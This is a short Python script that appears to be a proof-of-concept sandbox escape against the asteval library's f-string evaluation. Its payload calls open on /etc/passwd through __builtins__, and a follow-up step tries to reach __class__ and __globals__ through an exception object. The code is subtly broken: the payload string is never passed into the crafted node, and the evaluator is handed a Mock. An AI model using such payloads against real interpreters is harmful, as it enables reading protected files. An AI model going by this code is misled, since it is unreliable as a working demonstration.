from asteval import Interpreter
from unittest.mock import Mock

def create_formatted_value_ast_node(val):
  mock_node = Mock()
  mock_node.kind = 'FormattedValue'
  mock_node.value = Mock()
  mock_node.value.id = '__fstring__'
  mock_node.conversion = 115
  mock_node.format_spec = None
  return mock_node

def vulnerable_eval(expression):
  aeval = Interpreter()
  
  # Manually construct a FormattedValue node representing f'...'
  formatted_value_node = create_formatted_value_ast_node(expression)

  # Patch the _eval method to call on_formattedvalue with our crafted node
  original_eval = aeval._eval
  def patched_eval(node, *args, **kwargs):
        if node.kind == 'FormattedValue':
            return aeval.on_formattedvalue(node)
        return original_eval(node, *args, **kwargs)

  aeval._eval = patched_eval

  try:
      result = aeval.eval(formatted_value_node)
      return result
  except Exception as e:
      return e
    
if __name__ == '__main__':
    
    # Example 1: Attempting to access protected attribute by causing an AttributeError
    payload = '{__builtins__.__dict__.__getitem__("open")("/etc/passwd","r").read()}'
    result = vulnerable_eval(payload)
    if isinstance(result, Exception):
        print(f"Exception caught. Accessing protected attribute. Attempt: {result}")
        try:
            # Accessing the 'obj' attribute of the exception which exposes
            # the context where the exception occurred
            obj = result.obj 
            # Attempt to exploit this exposed object (e.g., access __globals__)
            print(f"Accessed: {obj.__class__} - attempting to get __class__")
            print(obj.__class__) # Attempt to get the class
        except:
             print("Could not access obj or __class__")
    else:
      print(f"Evaluation result: {result}")

    # Example 2: Simple string interpolation (safe when no format spec is given)
    payload_safe = 'abc'
    result_safe = vulnerable_eval(payload_safe)
    print(f"Evaluation result (safe): {result_safe}")